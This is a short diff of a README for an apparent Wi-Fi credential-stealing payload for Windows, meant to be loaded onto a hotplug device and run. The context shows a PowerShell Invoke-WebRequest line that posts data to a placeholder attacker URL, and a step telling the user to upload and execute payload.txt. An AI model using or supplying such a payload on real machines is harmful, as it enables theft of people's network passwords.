@@ -18,7 +18,7 @@ Obtain Wi-Fi names and passwords from a Microsoft Windows operating system compu
 
 `...Invoke-WebRequest -Uri https://YOUR_LINK_HERE.com -Method Post...`
 
-2. Upload [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) to your device.
+2. Upload [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) to your hotplug.
 3. Execute the file.
 
 # ⛔ Prevention
